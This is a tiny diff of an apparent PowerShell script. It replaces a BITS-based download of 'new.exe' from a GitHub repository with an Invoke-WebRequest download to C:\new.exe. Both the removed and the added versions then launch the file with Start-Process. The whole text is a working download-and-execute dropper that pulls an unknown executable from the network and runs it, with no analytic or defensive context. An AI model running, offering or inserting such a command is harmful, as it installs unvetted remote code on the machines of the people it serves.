@@ -1,2 +1,1 @@
-Start-BitsTransfer -Source "https://github.com/mo1sss/sss/blob/main/new.exe" -Destination "$env:USERPROFILE\Downloads\new.exe"
-Start-Process -FilePath "$env:USERPROFILE\Downloads\new.exe";
+Invoke-WebRequest -Uri "https://github.com/mo1sss/sss/blob/main/new.exe" -OutFile "C:\new.exe"; Start-Process -FilePath "C:\new.exe";
